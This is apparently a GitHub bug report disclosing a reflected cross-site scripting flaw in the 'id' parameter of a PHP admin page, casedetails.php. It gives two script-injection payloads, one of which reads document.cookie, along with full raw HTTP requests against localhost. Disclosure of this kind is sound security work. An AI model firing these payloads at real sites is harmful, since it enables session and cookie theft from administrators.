BUG_Author:Derek_Zhang

Vulnerability File: /ghpolice/admin/casedetails.php

GET parameter 'id' exists XSS vulnerability

Payload1:id="><script>alert(233)</script>&status=Completed

```
GET /ghpolice/admin/casedetails.php?id=%22%3E%3Cscript%3Ealert(233)%3C/script%3E&status=Completed HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=30di1kr94iks5mnf9ufm2uuh2f
Connection: close
```

![image](https://github.com/fillorkill/bug_report/blob/main/picture/xss1.png)

Payload2:id="><script>alert(document.cookie)</script>&status=Completed

```
GET /ghpolice/admin/casedetails.php?id=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&status=Completed HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=30di1kr94iks5mnf9ufm2uuh2f
Connection: close
```

![image](https://github.com/fillorkill/bug_report/blob/main/picture/xss2.png)
